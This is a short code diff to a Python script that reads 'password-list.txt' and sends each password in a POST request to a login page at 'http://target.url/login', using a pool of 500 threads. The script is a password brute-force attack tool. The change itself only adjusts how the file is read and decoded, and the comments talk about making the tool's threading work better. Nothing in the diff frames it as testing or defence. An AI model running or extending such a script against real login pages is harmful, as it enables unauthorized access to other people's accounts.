@@ -24,7 +24,7 @@ def load_object(obj, filename):
 ## It works, but doesn't limit the number of threads spun up. 
 ## Also doesn't handle blocking functions too well.
 def thread_starter():
-    with open('password-list.txt', 'rb') as f:
+    with open('password-list.txt', 'r') as f:
         passwords = f.read().splitlines()
     pool = ThreadPool(500)
     results = pool.map(start, passwords)
@@ -32,7 +32,7 @@ def thread_starter():
     pool.join()
 
 def start(password):
-    password = password.decode('utf-8').strip()
+    password = password.strip()
     try:
         r = requests.post("http://target.url/login", data={'password':password})
     except Exception as e:
